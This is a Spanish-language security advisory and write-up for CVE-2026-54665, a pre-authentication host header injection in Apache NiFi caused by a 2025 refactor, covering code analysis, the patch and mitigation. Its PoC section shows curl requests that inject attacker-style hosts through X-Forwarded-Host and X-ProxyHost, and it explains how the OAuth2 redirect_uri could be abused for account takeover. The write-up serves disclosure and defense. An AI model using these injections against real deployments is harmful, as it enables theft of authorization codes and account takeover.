# CVE-2026-54665: Host header injection pre-auth en Apache NiFi

**Publicado:** 2026-06-20 **Reportado:** 2026-05-15 **Severidad:** 5.4 Media (baseline) / 8.1 Alta (con OIDC) **Estado:** Corregido en NiFi 2.10.0 **CWEs:** CWE-444 (Inconsistent Interpretation of HTTP Requests) + CWE-601 (Open Redirect)

---

Una inyección de host header pre-autenticación en Apache NiFi. Cualquier cliente sin autenticar podía enviar `X-Forwarded-Host` o `X-ProxyHost` y ver ese valor reflejado en las URIs que NiFi construye para el redirect de OAuth2, el SP entity de SAML, el dominio de la cookie CSRF, y el endpoint público `/nifi-api/authentication/configuration`. Afectado: 0.0.1 hasta 2.9.0. Corregido en 2.10.0.

Lo interesante no es el bug en sí, es cómo llegó ahí. Un refactor de 2025 (NIFI-14209) borró el `HostHeaderHandler` que había estado validando la allowlist documentada `nifi.web.proxy.host` durante una década, y lo reemplazó por un customizer que solo valida **puertos**. La allowlist seguía apareciendo en docs y configs después del refactor, pero en runtime nada leía la parte del host.

---

## El bug

`nifi-commons/nifi-web-servlet-shared/src/main/java/org/apache/nifi/web/servlet/shared/StandardRequestUriProvider.java:97-115`:

```java
private String getHost(final HttpServletRequest request) {
    final String host;
    final String serverName = request.getServerName();
    final String headerHost = getFirstHeader(request,
        ProxyHeader.PROXY_HOST,        // X-ProxyHost
        ProxyHeader.FORWARDED_HOST,    // X-Forwarded-Host
        ProxyHeader.HOST               // Host
    );
    if (headerHost == null) {
        host = serverName;
    } else {
        final Matcher matcher = HOST_PATTERN.matcher(headerHost);
        if (matcher.matches()) {
            host = matcher.group(FIRST_GROUP);
        } else {
            host = serverName;
        }
    }
    return host;
}
```

El pattern es `^([^:]+):?([1-9][0-9]{2,4})?$`. Acepta cualquier string sin colon en la parte del host. `attacker.example.com`, `nifi-prod.example.com.evil-attacker.net`, `127.0.0.1`. Todo matchea. No hay chequeo contra ninguna allowlist.

Comparalo con `getPath()` unas líneas más abajo en el mismo archivo: ese sí valida `X-ProxyContextPath`, `X-Forwarded-Context` y `X-Forwarded-Prefix` contra `nifi.web.proxy.context.path` y tira `IllegalArgumentException` cuando el valor no está en la allowlist. La inspección del host simplemente se olvidó de hacer lo mismo.

## La allowlist que no valida hosts

`NiFiProperties.java:1603-1614` parsea la propiedad `nifi.web.proxy.host` a una lista:

```java
public List<String> getAllowedHostsAsList() {
    String rawProperty = getProperty(WEB_PROXY_HOST, "");
    List<String> hosts = Arrays.asList(rawProperty.split(","));
    return hosts.stream()
            .map(this::normalizeHost)
            .filter(host -> !StringUtils.isBlank(host))
            .collect(Collectors.toList());
}
```

El único caller es `FrameworkServerConnectorFactory.getValidPorts()`, que extrae solo el **puerto** de cada entrada para armar el set de puertos aceptados por el listener de Jetty:

```java
private static Set<Integer> getValidPorts(final NiFiProperties properties) {
    final Set<Integer> validPorts = new HashSet<>();
    final int serverPort = getPort(properties);
    validPorts.add(serverPort);
    final List<String> allowedHosts = properties.getAllowedHostsAsList();
    for (final String allowedHost : allowedHosts) {
        final Matcher portMatcher = HOST_PORT_PATTERN.matcher(allowedHost);
        if (portMatcher.matches()) {
            final String portGroup = portMatcher.group(PORT_GROUP);
            final int allowedPort = Integer.parseInt(portGroup);
            validPorts.add(allowedPort);
        }
    }
    return validPorts;
}
```

Entonces un operator que lee la sección del admin guide sobre `nifi.web.proxy.host`, la setea a `nifi.example.com,nifi-internal.example.com`, y asume que NiFi va a rechazar requests con otros host values, se equivoca. NiFi solo usaba esas entradas para saber qué **puertos** eran válidos.

## PoC

Server: `apache-nifi-2.9.0-bin.zip` arrancado con `conf/nifi.properties` por default (solo cambié `nifi.web.https.port=18443` para liberar el puerto por default). Modo single-user, HTTPS en `127.0.0.1:18443`.

Baseline:

```bash
$ curl -sk --resolve localhost:18443:127.0.0.1 -H 'Accept: application/json' \
    https://localhost:18443/nifi-api/authentication/configuration
{"authenticationConfiguration":{"externalLoginRequired":false,"loginSupported":true,
 "loginUri":"https://localhost:18443/nf/#/login",
 "logoutUri":"https://localhost:18443/nifi-api/access/logout/complete"}}
```

Con `X-Forwarded-Host`:

```bash
$ curl -sk --resolve localhost:18443:127.0.0.1 -H 'Accept: application/json' \
    -H 'X-Forwarded-Host: attacker.example.com' \
    https://localhost:18443/nifi-api/authentication/configuration
{"authenticationConfiguration":{"externalLoginRequired":false,"loginSupported":true,
 "loginUri":"https://attacker.example.com:18443/nf/#/login",
 "logoutUri":"https://attacker.example.com:18443/nifi-api/access/logout/complete"}}
```

Con `X-ProxyHost`:

```bash
$ curl -sk --resolve localhost:18443:127.0.0.1 -H 'Accept: application/json' \
    -H 'X-ProxyHost: evil.example.com' \
    https://localhost:18443/nifi-api/authentication/configuration
{"authenticationConfiguration":{"externalLoginRequired":false,"loginSupported":true,
 "loginUri":"https://evil.example.com:18443/nf/#/login",
 "logoutUri":"https://evil.example.com:18443/nifi-api/access/logout/complete"}}
```

Vale la pena notar: el Host header a nivel TLS sí está correctamente gateado. Un request con `Host: attacker.example.com` pero SNI matcheando devuelve `Error 400 Invalid SNI` porque `SecureRequestCustomizer` de Jetty enforza SNI-contra-Host. Esa defensa cubre el Host header a nivel TLS. No cubre los dos headers HTTP a nivel aplicación de arriba, que son exactamente los headers que un reverse proxy delante de NiFi forwardearía desde clientes no confiables.

## Consumidores downstream

`RequestUriBuilder.fromHttpServletRequest()` se llama desde 26 sitios distintos del framework de NiFi. El host reflejado viaja hasta todos. Los críticos para seguridad:

| Call site | Qué construye |
|---|---|
| `StandardOAuth2AuthorizationRequestResolver.java:97` | OAuth2 `redirect_uri` enviado al IdP OIDC |
| `StandardRelyingPartyRegistrationResolver.java:114` | SAML SP entity y ACS URI en el AuthnRequest |
| `OidcAuthenticationSuccessHandler.java:102, 105` | Target de redirect post-OIDC |
| `Saml2AuthenticationSuccessHandler.java:103, 106` | Target de redirect post-SAML |
| `OidcLogoutSuccessHandler.java:213` | Target de redirect post-OIDC-logout |
| `StandardCookieCsrfTokenRepository.java:71` | URI de cookie CSRF, usada para derivar el dominio |
| `AuthenticationResource.java:99` | Respuesta anónima de `/nifi-api/authentication/configuration` |
| `FlowResource.java:398, 2621` | URIs del content-viewer |
| `ApplicationResource.java:173, 187, 329` | Request URIs usadas para replicación de cluster |

El impacto verificado es la reflexión anónima de `/authentication/configuration`. El interesante es el `redirect_uri` de OAuth2. Para deployments con OIDC habilitado, el `redirect_uri` que se le manda al IdP viene del host controlable por el atacante. Contra un IdP que acepta redirect URIs no registradas, o uno que hace loose wildcard matching contra URIs registradas (más común de lo que uno quisiera), el atacante controla a dónde se entrega el authorization code. Esa es la diferencia entre un bug de reflexión de impacto medio 5.4 y una primitive de account takeover de impacto alto 8.1.

## Cómo llegó ahí: NIFI-14209

Commit `ae5a77b84f5c7e5e51e85e99f1d40079dbdee5f1`, mergeado el 2025-02-05, titulado "Restructured Host Header Validation". El commit message dice:

> Replaced HostHeaderHandler with HostPortValidatorCustomizer.
> Jetty SecureRequestCustomizer enforces host validation for SNI with Server Certificate DNS Subject Alternative Names.
> Added tests for TLS SNI with invalid host and port values.
> Refactored and streamlined RequestUriBuilder.fromHttpServletRequest().

El diff borró `HostHeaderHandler.java`, 318 líneas, el `Handler` de Jetty que había estado consumiendo la lista `nifi.web.proxy.host` y rechazando requests con host values fuera de ella. El reemplazo, `HostPortValidatorCustomizer.java`, tiene 85 líneas y solo valida puertos.

La premisa era que `SecureRequestCustomizer` cubre la validación de host vía TLS SNI. Esa premisa es correcta para el Host header a nivel TLS. No se generaliza a los dos headers a nivel aplicación (`X-Forwarded-Host`, `X-ProxyHost`) que `StandardRequestUriProvider.getHost()` lee a continuación. El refactor movió el trust boundary sin actualizar a los readers del otro lado.

## Versiones afectadas

- Apache NiFi 0.0.1 hasta 2.9.0 (vulnerables, según el advisory oficial)
- Apache NiFi 2.10.0 (parcheado)

El commit NIFI-14209 que introdujo la regresión fue mergeado en febrero de 2025. Las versiones anteriores a 2.2.0 retenían la defensa original de `HostHeaderHandler`; la regresión es desde ese punto en adelante.

## El parche

NiFi 2.10.0 (Jira NIFI-15953, [PR #11268](https://github.com/apache/nifi/pull/11268)) agrega de vuelta la validación con allowlist, esta vez cubriendo `X-ProxyHost` y `X-Forwarded-Host` además del Host header. El parche hace lo mismo que `getPath()` ya hacía para los headers de context-path. Del advisory:

> Apache NiFi 2.10.0 implements validation for the X-ProxyHost and X-Forwarded-Host HTTP request headers based on the nifi.web.proxy.host property. Enabling header validation requires configuring the application with HTTPS. Reverse proxy servers in front of Apache NiFi are responsible for filtering input request headers and providing allowed values to the application.

Para operators en 2.2.0 hasta 2.9.0 que no pueden actualizar inmediatamente, la mitigación es stripear `X-Forwarded-Host` y `X-ProxyHost` en el reverse proxy antes de que lleguen a NiFi. El `nifi.properties` por default no advierte sobre esto; si corrés NiFi atrás de algo que forwardea esos headers desde clientes no confiables, audita la config.

## Divulgación

Reportado a `security@nifi.apache.org` el 2026-05-15 con la reproducción de arriba. El triage y desarrollo del parche del lado de Apache fue rápido. CVE asignado, PR mergeado, advisory publicado el 2026-06-20.

## Links

- Advisory: https://nifi.apache.org/documentation/security/#CVE-2026-54665
- CVE record: https://www.cve.org/CVERecord?id=CVE-2026-54665
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-54665
- Jira: https://issues.apache.org/jira/browse/NIFI-15953
- Fix PR: https://github.com/apache/nifi/pull/11268
- CWE-444: https://cwe.mitre.org/data/definitions/444.html
- CWE-601: https://cwe.mitre.org/data/definitions/601.html
